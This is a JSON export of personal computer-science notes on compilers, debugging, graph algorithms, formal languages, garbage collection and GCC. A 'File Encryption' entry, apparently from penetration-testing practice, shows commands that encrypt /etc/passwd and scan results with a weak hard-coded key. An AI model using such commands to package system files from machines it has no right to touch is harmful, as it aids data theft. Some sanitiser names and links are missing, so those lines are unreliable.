    "content": "# Cross-Compilation\n---\nTo understand the concept of cross-compilation, let’s revisit the definition of a [compiler](notes/general/compilers.md). A [compiler](notes/general/compilers.md) is a program that converts a program from one language to another. But the word 'compiler' is often used to refer to a program that translates a program to a machine language to create an executable that runs on a computing device. Commonly, a [compiler](notes/general/compilers.md) is used to generate machine code for the same machine that the [compiler](notes/general/compilers.md) itself is running. By the same machine, we mean the same architecture. For example, a [compiler](notes/general/compilers.md) running on a linux-x64 machine compiling a C++ program and generating machine code for the same linux-x64 machine. This program can run on all linux-x64 machines, as long as a similar environment is provided.\n\nHowever, there are situations where we want to generate binaries for a machine type other than the [compiler](notes/general/compilers.md) it is running on. For example, if the target machine is not powerful enough. This is often the case while generating binaries for embedded devices, mobile apps, etc. A cross-compiler generates binaries that will run on a different machine (target machine) than the one where the [compiler](notes/general/compilers.md) itself is running (the host machine). This is a slightly complicated process, as it requires all the dependencies of the target machine to be present on the host machine.\n\nAs an example, when compiling a simple `hello-world` program for a host machine, the `stdio.h` header file in place like `/usr/include/stdio.h` is used. For generating a cross-compiled `hello-world` program, the `stdio.h` will be found in a different [sysroot](notes/general/sysroot.md). So, the [compiler](notes/general/compilers.md) invocation may look like:\n\n```bash\ngcc --sysroot=/path/to/aarch64/sysroot -march=armv8-a hello.c\n```\n\nAn even more convoluted setup is the [](https://en.wikipedia.org/wiki/Cross_compiler#Canadian_Cross), where there are two cross-compilers involved. In this setup, there are three machines A, B, and C. The cross-compiler in A (CA) will generate another cross-compiler (CB) that will run on B. CB will generate code for machine C.",
    "lastmodified": "2022-11-24T12:20:57.665770292Z",
    "tags": null
  },
  "/notes/general/cs-problems": {
    "title": "CS Problems",
    "content": "# CS Problems\n---\n- [P vs NP problem.](notes/general/p-vs-np.md)\n- K-clique in a graph.\n- Boolean satisfiability.\n- Travelling Salesman problem.\n- Knapsack problem.\n- [Linear Knapsack Problem.](notes/general/linear-knapsack-problem.md)\n- Optimise branches and short branches.\n- Colour vertices of graph with k colours.\n- [Halting Problem](notes/general/halting-problem.md)\n\n## Harder Problems\n- Ackermann's function.\n- Does a regular expression cover all regular expressions possible for its alphabet.",
    "lastmodified": "2022-11-24T12:20:57.678938031Z",
    "tags": null
  },
  "/notes/general/debugging-techniques": {
    "title": "Debugging Techniques",
    "content": "# Debugging Techniques\n---\nDebugging is an essential part of the software development lifecycle. Even with the most robust programming practices bugs creep in, and debugging them is not a pleasant experience. On any widely used software, there are many developers contributing code, and debugging takes a significant portion of developers' time. \n\nThat is why software development methodologies like [Test Driven Development](https://en.wikipedia.org/wiki/Test-driven_development), [Defensive Programming](https://en.wikipedia.org/wiki/Defensive_programming), and [Programming/Design by contract](https://en.wikipedia.org/wiki/Design_by_contract) are adopted by many organisations. Some programming languages even provide support for some methodologies; for example, [D](https://en.wikipedia.org/wiki/D_(programming_language)) implements [contract programming](https://dlang.org/spec/contracts.html) features.\n\nDebugging native applications is difficult because of the semantics of the programming language, the variety of dependent software, the dependencies on hardware features like threading model, memory model, etc. It is therefore essential to know the different debugging technologies available to us.\n\n## Types of Bugs in Programs\nIn general, application failures can be broadly classified into three categories:\n\n1. Programming errors (syntax errors, semantic errors, runtime errors)\n2. System failure (memory errors, file corruption, network failure, etc.)\n3. Invalid data (bad file name, bad data)\n\nSome bugs are difficult to classify in a specific bucket as the classification may depend on the point of reference. For example, data corruption by one application may cause a dependent application to throw a runtime error. \n\nDepending on the type of failure, different tools and methodologies are deployed. In this chapter, we focus on programming errors and the following sections introduce tools and techniques pertaining to those.\n\n## Debugging Tools and Techniques\nWhile working on toolchains, system bringup or developing system software, commonly used debugging techniques can be divided into four categories:\n\n1. Instrumentation-based debugging\n2. Debugging using a debugger\n3. Remote debugging using gdb\n4. JTAG-based debugging\n\n### Instrumentation debugging\nInstrumentation-based debugging techniques are methods to insert code to programs, either manually or programmatically. This helps get insights into the code when the program runs. There are three commonly used techniques in this category:\n\n1. Print debugging\n2. Assertion-based debugging\n3. Sanitisers\n\nWhile print and assertion-based debugging are some of the earliest debugging techniques, sanitisers are relatively new. We briefly describe each technique below.\n\n#### Print Debugging \nThe simplest debugging technique is to add a set of print statements in the program and observe the printed values. Inserting print statements at carefully identified program points can help debug the program. \n\nThis is one of the earliest debugging techniques and is quite useful even today. This approach however fails in several cases, as it does not scale well. Unless the programmer has good knowledge of the code at hand, it is difficult to find issues quickly with this approach.\n\n#### Assertion-based Debugging\nIn order to establish preconditions and postconditions at various program points, it is common to insert assertions. Failure of assertion simplifies debugging. It also helps detect bugs early during the development stage. Usually, assertions are disabled in production code, so one of the first steps to debug is to enable assertions and run the failing test scenario.\n\n#### Sanitisers\nBoth clang and GCC provide instrumentations (sanitisers) that can detect several well-known classes of errors like buffer overflow, memory corruption, etc. There are sanitiser, sanitiser, undefined behaviour sanitiser, thread sanitiser, etc.\n\nThis provides an automated way of detecting bugs. Sanitisers also require runtime support to find bugs and it is not available on all platforms. RISC-V for example currently has support for sanitiser and sanitiser only. [This document](https://github.com/google/sanitizers) is the source of truth for all sanitiser documentation.\n\nOn some platforms, [Valgrind](https://valgrind.org/) can also detect errors that are detected by some sanitisers, like memory corruption, leaks, etc. Unfortunately, Valgrind is currently not available for RISC-V platforms.\n\n## Debugging Using a Debugger\nWhen a debugger is available, it becomes very convenient to inspect programs, get backtraces, values of objects, the state of different threads, etc. Learning to effectively use a debugger like [gdb](notes/general/gdb.md) greatly simplifies software development. [](notes/general/useful-commands-dump.md#GDB%7CFrequently%20used%20%60gdb%60%20commands.)\n\n## Remote Debugging\nInfo on remote debugging on GDB can be found [](notes/general/gdb.md#Remote%20Debugging%7Chere).\n\n## JTAG-based Debugging\nDuring the early bringup phase of hardware, there are no software capabilities. In order to debug bare metal applications or access different hardware blocks, JTAG (named after the Joint Test Action Group) is used as the transport mechanism. \n\nMost modern hardware provides ways to directly trace instructions and data using a standard protocol called JTAG, although each hardware vendor may have different levels of support. It is frequently used to debug hardware issues. \n\nRISC-V defines a standard interface for external debugging, this includes accessing hardware threads (hart) from the very first instruction, accessing memory, single-stepping instructions, etc.\n\n## References\n- [Cornell University, CS312 Lecture 26, Debugging Techniques](https://www.cs.cornell.edu/courses/cs312/2006fa/lectures/lec26.html)\n- [Debugging with GDB](https://www.sourceware.org/gdb/current/onlinedocs/gdb.html)\n- [Tim Newsome - RISC-V External Debug (aka JTAG debugging)](aka%20JTAG%20debugging))\n- [Tim Newsome and Megan Wachs - RISC-V External Debug Support Version 0.13.2](https://riscv.org/wp-content/uploads/2019/03/riscv-debug-release.pdf)\n- [](https://five-embeddev.com/riscv-debug-spec/latest/introduction.html#sec:intro)\n- [University of San Francisco - Programming \"By Contract\"](https://www.cs.usfca.edu/~parrt/course/601/lectures/programming.by.contract.html)\n- [](https://github.com/riscv/riscv-isa-sim#debugging-with-gdb)",
    "lastmodified": "2022-11-24T12:20:57.700257301Z",
    "tags": null
  },
  "/notes/general/dijkstra-algorithm": {
    "title": "Dijkstra Algorithm",
    "content": "# Dijkstra Algorithm\n---\nIt is used to determine the **shortest path** from one node in the graph to **every other** node within the same graph, provided they can be reached from the source node.\n\nIts complexity is $O_(n^2)$.\n\nThe graph must have **non-negative weights** on **all** edges.\n\n \n## How It Works\n![dijkstra_graph](notes/images/dijkstra_graph.png)\n- Given the graph above, to find the shortest path between A and F, three values need to be initialised:\n\n1. Array of distances from the source node (A) to each node in the graph. The weight of the source node is instantiated as 0 while all the other nodes initial value is infinity.\n2. Array of all nodes in the graph, which will be empty by the end (unvisited array).\n3. Array of all the nodes that the algorithm has visited, which by the end will contain all the nodes of the graph (visited array).\n\n### Example\nStarting from the source (A), we visit its neighbour with the lowest weight (B).\n\nWe then check:\n```c\nif (D[current_node]) + D[adjacent_edge] \u003c D[adjacent])\n```\n\nIf **true**, we update the adjacent distance with the new shortest path.\n\nUsing A as a starting point, from A to B: D = 0 + 2 which is \u003c D[B] = infinity. Therefore, we update.\n\nAs you can see on the graph, when in current node A (starting node), the cost of going to its neighbours, B and C, is of 2 and 4 respectively. Because 2 and 4 are less than B and C current values (infinity), we update the table.\n\nNote that the letter next to the number indicates what path is was taken:\n| Current Node | A   | B   | C   | D   | E   | F   |\n| ------------ | --- | --- | --- | --- | --- | --- |\n| A            | 0A  | 2A  | 4A  |     |     |     |\n\nNow with **B** being the current node, we repeat. For example, to get C there is a cost of 1. We sum B's current distance from the source with the distance to C and check if it is less than the current value (infinity).\n| Current Node | A   | B   | C   | D   | E   | F   |\n| ------------ | --- | --- | --- | --- | --- | --- |\n| A            | 0A  | 2A  | 4A  |     |     |     |\n| B            | 0A  | 2A  | 3B  | 6B  | 4B  |     |\n\nNow moving on to **C**, it has only one unchecked neighbour, E. The cost of getting to E, through C, is 4 + 3 = 7. However, the cost of getting to E (through B) is currently 4. Therefore, we don't update the table as C isn't the shorted path to E.\n\nWe then iterate until we visit all the nodes. The completed table for that graph would look like this:\n| Current Node | A   | B   | C   | D   | E   | F   |\n| ------------ | --- | --- | --- | --- | --- | --- |\n| A            | 0A  | 2A  | 4A  |     |     |     |\n| B            | 0A  | 2A  | 3B  | 6B  | 4B  |     |\n| C            | 0A  | 2A  | 3B  | 6B  | 4B  |     |\n| E            | 0A  | 2A  | 3B  | 6B  | 4B  | 6E  |\n| D            | 0A  | 2A  | 3B  | 6B  | 4B  | 6E  |\n| F            | 0A  | 2A  | 3B  | 6B  | 4B  | 6E  |\n\n## See also\n- [Graphs](notes/general/graphs.md)\n- [Floyd-Warshall](notes/general/floyd-warshall.md)\n",
    "lastmodified": "2022-11-24T12:20:57.724003911Z",
    "tags": null
  },
  "/notes/general/dotfile-management": {
    "title": "Dotfile Management",
    "content": "# Dotfile Management\n---\nMy dotfiles can be found on [GitHub](https://github.com/pietraferreira/dotfiles).\n\nJust type `config` anywhere, for example `config status` to manage the repo.\n\n## Resources\n* [Dotfiles management](https://www.ackama.com/what-we-think/the-best-way-to-store-your-dotfiles-a-bare-git-repository-explained/)",
    "lastmodified": "2022-11-24T12:20:57.830339789Z",
    "tags": null
  },
  "/notes/general/embedded-applications": {
    "title": "Embedded Applications",
    "content": "# Embedded Applications\n---\nThe definition and use case of embedded systems have evolved over time. While embedded systems are used to denote computing systems performing very specific tasks, it is no longer the case in many situations. Although most embedded systems are designed to perform a limited set of tasks, depending on the application, the tasks themselves may be simple or quite complex. \n\nEmbedded systems may have simple microcontrollers, or complex Digital Signal Processors (DSPs), or even microprocessors. Even with substantial variabilities across systems, few things are generally true for all:\n\n-   They are low-powered or battery-operated devices.\n-   They have limited storage.\n-   They do not upgrade the applications frequently.\n\nThere might be other things, but these three are a good starting point to understand how we can optimise these applications using compiler techniques.\n\n## Optimising for Power\nIn order to reduce the power consumed while the application is running, there are two schools of thought:\n\n- Execute/Design instructions that are low-powered\n- Execute instructions as fast as possible and go to idle mode.\n\nEach approach has its pros and cons.\n\n### Execute/Design instructions that are low-powered\nA processor has many instructions that can achieve the same computation. Each type of instruction consumes different amounts of system resources and is suitable for specific cases. For example, a floating-point operation may be more expensive than integer operations. In several embedded hardware, floating-point units aren’t present to begin with, and they use software routines to perform in case any floating-point operations arise in rare cases.\n\nCompilers, to the best of our knowledge, do not have a direct way to select only low-power consuming instructions. As a result, this approach is mostly applicable for hardware engineers. In limited situations, compiler engineers can take advantage of this approach when they have better insight into the processor and running applications; for example, vectorisation can be disabled as vector units often consume more power than scalar instructions.\n\nThere are also situations where a system can have [big+little configuration](https://www.arm.com/why-arm/technologies/big-little). The more powerful processors are only used when the demand for compute increases, otherwise computations are performed on low-power processors. If we can compile compute-heavy parts of the code for powerful processors ([`-mtune` flag](https://gcc.gnu.org/onlinedocs/gcc/ARM-Options.html)) and rest for the low-power processor, we can take advantage of this feature. This strategy will require regular updates to build flags combined with profile-guided optimisation.\n\n### Execute instructions as fast as possible and go to idle mode\nSome processors can have advanced [dynamic voltage and frequency scaling](https://en.wikipedia.org/wiki/Dynamic_frequency_scaling) capabilities. So, whenever there is no work to do, processors go into low-power idle mode. As a result, it makes sense to run applications as fast as possible and defer the responsibility of power management to the processor. To run the application as fast as possible, we can use higher optimisation levels like `-O3`, `-Ofast`; we can combine that with link time optimisations and profile guided optimisation to achieve even better performance.\n\n## Optimising for Binary Size\nCheck out [](notes/general/compiler-optimisation.md#Optimising%20Programs%20for%20Code%20Size%7COptimising%20for%20Code%20Size).\n\n## References\n- [RISC-V Toolchain and Compiler Optimization Techniques](https://learning.edx.org/course/course-v1:LinuxFoundationX+LFD113x+3T2021/home)\n- [Aditya Kumar - Code Size Compiler Optimizations and Techniques for Embedded Systems](https://www.youtube.com/watch?v=6IuDWfuMEno)\n- [Aditya Kumar \u0026 Sebastian Pop - Performance analysis and optimization of C++ standard libraries](https://www.youtube.com/watch?v=OTCp_AkAyRQ)\n- [Visual Studio Developer Community - pragma optimize off is not working as expected](https://developercommunity.visualstudio.com/t/192628900-pragma-optimize-off-is-not-working-as-ex/1091452)\n- [nm(1) - Linux man page](1)%20-%20Linux%20man%20page)\n- [GCC Instrument functions](https://hacktalks.blogspot.com/2013/08/gcc-instrument-functions.html)\n- [Nitin Kumar - Profile-guided optimization (PGO) using GCC on IBM AIX](PGO)%20using%20GCC%20on%20IBM%20AIX)\n- [Aditya Kumar - Performance analysis and optimization](https://developercommunity.visualstudio.com/t/192628900-pragma-optimize-off-is-not-working-as-ex/1091452)\n- [Vinodha Ramasamy, Paul Yuan, Dehao Chen, Robert Hundt - Feedback-Directed Optimizations in GCC with Estimated Edge Profiles from Hardware Event Sampling](https://research.google/pubs/pub36576/)\n",
    "lastmodified": "2022-11-24T12:20:57.850023746Z",
    "tags": null
  },
  "/notes/general/endianness": {
    "title": "Endianness",
    "content": "# Endianness\n---\nThis is part of a guide that you can find [here](notes/general/htb-stack-based-overflow-linux.md).\n\nBytes are loaded in different order, called **endianness**.\n\n- **Big-endian**: the digits with the highest valence are initially.\n- **Little-endian**: the digits with lowest valence are beginning.\n\nMainframe processors use the **big-endian** format, some RISC architectures, minicomputers and TCP/IP also tend to use **big-endian**.\n\n-   Address: `0xffff0000`\n-   Word: `\\xAA\\xBB\\xCC\\xDD`\n\n| **Memory Address** | **0xffff0000** | **0xffff0001** | **0xffff0002** | **0xffff0003** |\n| --- | --- | --- | --- | --- |\n| Big-Endian | AA | BB | CC | DD |\n| Little-Endian | DD | CC | BB | AA |",
    "lastmodified": "2022-11-24T12:20:57.922330022Z",
    "tags": null
  },
  "/notes/general/engineer-training-hub": {
    "title": "Engineer Training Hub",
    "content": "# Engineer Training Hub\n---\n## Syllabus:\n- [Algorithms and Data Structure](notes/general/algorithms-and-data-structure.md)\n\n### Assembly programming\n\n### C/C++ Programming\n\n- [Compilers](notes/general/compilers.md)\n- [GNU](notes/general/gnu.md)\n\n### Functional Programming\n\n### Modeling\n\n### Operating Systems\n\n### Other Languages\n\n### Software Engineering",
    "lastmodified": "2022-11-24T12:20:57.959680915Z",
    "tags": null
  },
  "/notes/general/equivalent-grammars": {
    "title": "Equivalent Grammars",
    "content": "# Equivalent Grammars\n---\nEquivalent grammars define the same language:\n\n- G\nA $\\rightarrow$ Ax | y\n\n- G'\nA $\\rightarrow$ yB\nB $\\rightarrow$ yB | $\\varepsilon$\n\n- L(G) = L(G')\n\nOne grammar may be easier to parse than the other. \n\nNote however that they have very different parse [trees](notes/general/trees.md), and if the parse tree reflects the semantic structure for the language then the semantic information is lost.\n\nParse tree for yxx:\n![parse-tree-leftmost-rightmost](notes/images/parse-tree-leftmost-rightmost.png)\n\n## See Also\n- [Formal Languages](notes/general/formal-languages.md)\n",
    "lastmodified": "2022-11-24T12:20:57.966760397Z",
    "tags": null
  },
  "/notes/general/file-encryption": {
    "title": "File Encryption",
    "content": "# File Encryption\n---\n## Windows\n```powershell\nPS Import-Module .\\Invoke-AESEncryption.ps1\nPS Invoke-AESEncryption.ps1 -Mode Encrypt -Key 'p4ssw0rd' -Path .\\scan-results.txt \n```\n\n## Linux\n### Encrypt\n```bash\nopenssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc\n```\n\n### Decrypt\n```bash\nopenssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd\n```",
    "lastmodified": "2022-11-24T12:20:58.088012576Z",
    "tags": null
  },
  "/notes/general/fixups": {
    "title": "Fixups",
    "content": "# Fix-ups\n---\nFix-ups are used to represent information in instructions which is currently\nunknown. During instruction encoding, if some information is unknown (such as a memory location of an external symbol), it is encoded as if the value is equal\nto 0 and a fix-up is emitted which contains information on how to rewrite the\nvalue when information is known.\n\nThe assembler goes through a stage of relaxation, applying fix-ups and modifying instruction values when they become known to the system. Once complete, any remaining fix-ups are converted to [relocations](notes/general/relocations.md) and stored in the object file.\n\nSource: Embecosm",
    "lastmodified": "2022-11-24T12:20:58.096395612Z",
    "tags": null
  },
  "/notes/general/floyd-warshall": {
    "title": "Floyd-Warshall",
    "content": "# Floyd-Warshall\n---\nIt is a **shortest path** algorithm that calculates the shorted path between **all** pairs of vertices.\n\n- Negative edges are allowed.\n- No negative cycles.\n- $O(V^3)$, where V is the number of vertices.\n\n## Pseudo-code\n```c\nlet V = number of vertices of graph\nlet dist[V][V] = 2D array of minimum distances (the answers)\n\nfor each vertex v\n  dist[V][V] \u003c- 0\n\nfor each edge (u, v)\n  dist[u][V] \u003c- weight(u,V)\n\nfor k from 1 to V\n  for i from 1 to V\n    for j from 1 to V\n      if dist[i][j] \u003e dist [i][k] + dist[k][j]\n       dist[i][j] \u003c- dist[i][k] + dist[k][j]\n```\n\n## Example\nHere is a graph with four vertices (V = 4) and `dist[4][4]`:\n![fw-graph1](notes/images/fw-graph1.png)\n\n```c\nfor each vertex v\n  dist[v][v] \u003c- 0\n```\n![fw-graph2](notes/images/fw-graph2.png)\n\n```c\nfor each edge (u,v)\n  dist[u][v] \u003c- weight(u,v)\n```\n![fw-graph3](notes/images/fw-graph3.png)\n\n```c\nfor k from 1 to V\n  for i from 1 to V\n    for j from 1 to V\n    if dist[i][j] \u003e dist[i][k] + dist[k][j]\n      dist[i][j] \u003c- dist[i][k] + dist[k][j]\n```\n\nIf k = A, i = A and j = A:\n```c\ndist[i][j] \u003e dist[i][k] + dist[k][j]\ndist[A][A] \u003e dist[A][A] + dist[A][A]\n    0      \u003e     0      +     0\n```\n\nThis statement is **false**. Therefore, `dist` does not get updated:\n![fw-graph4](notes/images/fw-graph4.png)\n\nIf k = A, i = A and j = B then there is not yet a value for A-\u003eB. It is assumed to be infinite:\n```c\ndist[i][j] \u003e dist[i][k] + dist[k][j]\ndist[A][B] \u003e dist[A][A] + dist[A][B]\n infinity  \u003e     0      +  infinity\n```\n\nThis statement is **false**. Therefore, `dist` does not get updated.\n![fw-graph4](notes/images/fw-graph4.png)\n\nIf k = A, i = B and j = C:\n```c\ndist[i][j] \u003e dist[i][k] + dist[k][j]\ndist[B][C] \u003e dist[B][A] + dist[A][C]\n    3      \u003e     4      +    -2\n```\n\nThis statement is **true**. Therefore, `dist` gets updated:\n![fw-graph5](notes/images/fw-graph5.png)\n\n## See also\n- [Dijkstra](notes/general/dijkstra-algorithm.md)\n- [Graphs](notes/general/graphs.md)\n- [Big O Notation](notes/general/big-o-notation.md)\n",
    "lastmodified": "2022-11-24T12:20:58.130584002Z",
    "tags": null
  },
  "/notes/general/formal-languages": {
    "title": "Formal Languages",
    "content": "# Formal Languages\n---\nFormal languages are used among others as the basis for defining the grammar of programming languages and formalised versions of subsets of natural languages in which the words of the language represent concepts that are associated with particular meanings or semantics.\n\n- [Parse Trees](notes/general/parse-trees.md)\n    - [Chomsky Grammars](notes/general/chomsky-grammars.md)\n    - [Equivalent Grammars](notes/general/equivalent-grammars.md)\n    - [Ambiguous Grammars](notes/general/ambiguous-grammars.md)\n- [Syntax Directed Translation](notes/general/syntax-directed-translation.md)\n\n## Defining a Language\n- **Non-terminal** symbols appear on the **left** of productions.\n- **Terminal** symbols only ever appear on the **right** of productions.\n\n A **grammar** is a 4-tuple {_S_, P, N, T}, were S $\\exists$ N is the **sentence** symbol, P is a set of **productions**, N is the set of **non-terminal** symbols and T is the set of **terminal** symbols.\n\nGrammars generate strings. They are description of languages that provide a mean for generating all possible strings contained in the language.\n\nA **sentence** is a string of symbols in T derived from S using one or more applications of productions in P.\n\nThe **language**, L(G) defined by a grammar, G, is the set of sentences derivable using G.\n\n## Context-Free Grammar (CFG)\nEach production has the form A $\\rightarrow$ w, where A is a **nonterminal** and w is a string of terminals and nonterminals.  Informally, a CFG is a grammar where any nonterminal can be expanded out to any of its productions at any point. The language of a grammar is the set of strings of terminals that can be derived from the start symbol.\n\nA **context-free grammar** (CFG) consists of:\n1.  A set of _terminals_ (tokens produced by the lexer).\n2.  A set of _nonterminals_.\n3.  A set of _productions_ (rules for transforming nonterminals). These are written  \n        LHS → RHS  \n    where the LHS is a **single** nonterminal (that is why this grammar is **context-free**) and the RHS is a string containing nonterminals and/or terminals.\n4.  A specific nonterminal designated as start symbol.\n\n## Context-Sensitive Grammar (CSG)\nEach production has the form wAx $\\rightarrow$ wyx, where w and x are strings of terminals and nonterminals and y is also a string of terminals. In other words, the productions give rules saying \"if you see A **in a given context**, you may replace A by the string y.\" It's an unfortunate that these grammars are called \"context-sensitive grammars\" because it means that \"context-free\" and \"context-sensitive\" are not opposites, and it means that there are certain classes of grammars that arguably take a lot of contextual information into account but aren't formally considered to be context-sensitive.\n\nTo determine whether a string is contained in a CFG or a CSG, there are many approaches. First, you could build a recogniser for the given grammar. For CFGs, the _[pushdown automaton](http://en.wikipedia.org/wiki/Pushdown_automaton)_ (PDA) is a type of automaton that accepts precisely the context-free languages, and there is a simple construction for turning any CFG into a PDA. For the context-sensitive grammars, the automaton you would use is called a _[linear bounded automaton](http://en.wikipedia.org/wiki/Linear_bounded_automaton)_ (LBA).\n\nMore info [here](https://stackoverflow.com/questions/8236422/context-free-grammars-versus-context-sensitive-grammars).\n## Derivation\n- Productions (Backus-Naur Form, BNF):\n\n$A \\rightarrow B_1, B_2, B_3, ..., B_n$\n\nassign_stmnt $\\rightarrow$ variable := expression\n\nassign_stmnt := variable ':=' expression\n\n- Sentence symbol at the top of the grammar:\n\n$S\\rightarrow A_1, A_2, A_3, ..., A_n$\n\n- Alternative definitions of a symbol:\n\n$A\\rightarrow B_1, B_2, B_3, ..., B_n$\n\n$A\\rightarrow C_1, C_2, C_3, ..., C_n$\n\n$A\\rightarrow B_1, B_2, B_3, ..., B_n | C_1, C_2, C_3, ..., C_n$\n\n- Self-referential (recursive productions):\n\n$A \\rightarrow A\\ x | y$\n\n- Empty production:\n\n$A \\rightarrow B\\ |\\ \\varepsilon$\n\n### Another Example\n```\nTerminals: 0 1 2 3 4 5 6 7 8 9 + -\n    Nonterminals: list digit\n    Productions:\n        list → list + digit\n        list → list - digit\n        list → digit\n        digit → 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9\n    Start symbol: list\n```\n\nWatch how we can generate the string 7+4-5 beginning with the start symbol, applying productions, and stopping when no productions can be applied (because only terminals remain).\n\n```\n    list → list - digit\n         → list - 5\n         → list + digit - 5\n         → list + 4 - 5\n         → digit + 4 - 5\n         → 7 + 4 - 5s\n```\n\n## Recursive Productions\nRecursive productions are defined in terms of themselves:\n\nvarlist $\\rightarrow$ variable | varlist, variable\n\nif one of the alternatives contains the recursion at its **leftmost end**, the production is called **left recursive**:\n\nA $\\rightarrow$ u | Av\n\nWhere A $\\exists$ N and u, v are arbitrary strings in V.\n\nWe also have **right recursive** productions:\n\nA $\\rightarrow$ u | vA\n\nLeft recursion in particular can be problematic.\n\n## Attribute Types\nValues of attributes of items on the LHS of productions derived from values of attributes on the RHS are known as **synthesised** attributes:\n\nX $\\rightarrow$ $Y_1, Y_2, ..., Y_n$\n\nEach semantic rule can be written as:\n\nX.a = f($Y_1$.a, $Y_2$.a, ..., $Y_n$.a)\n\nWe can also have **inherited attributes**, where values of attributes on the RHS are derived from values of attributes on both the LHS and RHS.\n\n## Types of Attribute Grammars\n**S-attributed** grammars only use synthesised attributes, can evaluate correctly by a bottom-up walk over the parse tree.\n\n**L-attributed** grammars have inherited attributes in which all inherited attributes are only functions of symbols to their left in the production. They can be evaluated by left-to-right depth first traversal of the parse tree.\n\n## See Also\n- [Compilers](notes/general/compilers.md)\n- [Trees](notes/general/trees.md)\n",
    "lastmodified": "2022-11-24T12:20:58.146219969Z",
    "tags": null
  },
  "/notes/general/garbage-collection": {
    "title": "Garbage Collection",
    "content": "# Garbage Collection\n---\nHow do you reuse memory in a program?\n\nExplicit allocation and free: `malloc`/`free` (C), `new`/`delete` (C++).\n\nIt traces garbage collection and does reference counting.\n\n**Reach-ability**: reference directly or indirectly by one or more variables.\n    - Global variables.\n    - Stack variables.\n\n## Syntactic and Semantic Garbage\n```c\nclass Foo;\nclass Bar;\n\nmain ()\n{\n  Foo *x = new Foo ();\n  Bar *y = new Bar ();\n  x = new Foo ();\n  // The old Foo object assigned to x can never be accessed\n  // x is syntactic garbage\n  if (x.checkit ())\n    x.doit (y);\n  else\n    x.dontdoit ();\n  // In the above, whether y is garbage depends on the result\n  // of x.checkit (). y could be semantic garbage\n\n  exit (EXIT_SUCCESS);\n}\n```\n\n## Tracing\n### Mark and Sweep\nNaive mark-and-sweep. Start with *root* set:\n\n![mark-and-sweep-1](notes/images/mark-and-sweep-1.png)\n\nNow sweep up anything not marked:\n\n![mark-and-sweep-2](notes/images/mark-and-sweep-2.png)\n\n### Tri-Colour Marking\nTree sets:\n- White set (**condemned** set): candidates for memory recycling.\n- Black set: object shown to have no reference to the white set and reachable from the root set.\n- Grey set: object reachable from the root set, but not yet scanned for reference to white objects.\n\nTri-colour **invariant**: no black objects reference white objects.\n\nCan be performed \"on-the-fly\".\n\nStarting state:\n- Black set is empty.\n- Grey set has objects directly referenced from the root set.\n- White set has all other objects.\n\n#### Algorithm\n1. Pick an object from the grey set and move it to the black set.\n2. Move each white object it references to the grey set.\n3. Repeat previous two steps until the grey set is empty.\n4. All white objects can now be garbage collected.\n\n## Moving vs Non-Moving\nWhen you free space, should you compact all the free space?\n\n### Advantages\n- Clearing mark is trivial.\n- New objects can be allocated quickly.\n- Can move objects close to the objects they refer to, which is good for caches.\n\n### Disadvantages\n- More work when garbage collecting.\n- Pointer arithmetic is not preserved.\n\n## Reference Count\n### Advantages\n- Objects reclaimed as soon as they can no longer be referenced.\n- Simple to implement.\n- Can be useful input to other parts of the system.\n\n### Disadvantages\n- Frequent updates are inefficient.\n- Reference cycles are a problem.\n- Cannot optimise for caches.\n",
    "lastmodified": "2022-11-24T12:20:58.180264711Z",
    "tags": null
  },
  "/notes/general/gcc": {
    "title": "GCC",
    "content": "# GCC\n---\nThe popular gcc [compiler](notes/general/compilers.md) ships with the gcc toolchain. It can be downloaded from [GCC mirror sites](https://gcc.gnu.org/mirrors.html). In order to download the precompiled binaries that are ready to use, go to the _[Installing GCC: Binaries](https://gcc.gnu.org/install/binaries.html)_ page.\n\nThe toolchain contains the following top-level directories:\n\n```bash\nbin include libexec lib share\n```\n\nThe `bin` folder contains all the executable binaries, like the C [compiler](notes/general/compilers.md) (gcc), the C++ [compiler](notes/general/compilers.md) (g++), the Fortran [compiler](notes/general/compilers.md) (gfortran), and the D [compiler](notes/general/compilers.md)(gdc). It may contain the Go [compiler](notes/general/compilers.md) (gccgo) depending on the distribution. It also contains a set of other useful tools like `gcov`, `lto-dump`, etc.\n\nThe `include` folder contains a set of header files that are included during compilation. For example, the C++ header files like `iostream`, etc. Notice that C header files like `stdio.h` are not supplied with the toolchain because they are part of [sysroot](notes/general/sysroot.md).\n\nThe `lib` folder contains libraries like libstdc++, libatomic, etc. These libraries may be used by the gcc [compiler](notes/general/compilers.md) during the compilation process or can be used as a reusable set of libraries.\n\nThe `libexec` folder contains binaries that are invoked by the driver programs (gcc, g++, gdc). For example, gcc invokes `cc1` (the C [compiler](notes/general/compilers.md)), `collect2` (the linker), `lto1` (the link time optimiser), etc.\n\nThe `share` folder contains the documentation which can be installed as man pages, and a non-essential set of scripts.\n\n## Online resources\n-   [GCC online documentation](https://gcc.gnu.org/onlinedocs/)\n-   [GCC Resource Center](https://www.cse.iitb.ac.in/grc/)\n-   [Essential Abstractions in GCC](https://www.cse.iitb.ac.in/grc/index.php?page=gcc-pldi14-tut)\n-   [Videos of Lectures on Essential Abstractions in GCC -2012](https://www.cse.iitb.ac.in/grc/index.php?page=videos)\n-   [Compiler Internals Lecture by IIT Bombay [Part 1]](https://www.youtube.com/watch?v=IlovhbAI7Cw\u0026list=PLy-CGmBdq2VGjl56cyaEjxcAMyAvUKbCz)\n-   [GNU Tools Cauldron](https://www.youtube.com/channel/UCQ4JGczdlU3ofHWf3NuCX8g/featured)\n\n### Mailing lists\n-   [The Gcc-help Archives](https://gcc.gnu.org/pipermail/gcc-help/)\n\n## See Also\n- [Relocations](notes/general/relocations.md)\n- [Linker Relaxation](notes/general/linker-relaxation.md)",
    "lastmodified": "2022-11-24T12:20:58.211724401Z",
    "tags": null
  },
  "/notes/general/gdb": {
    "title": "GDB",
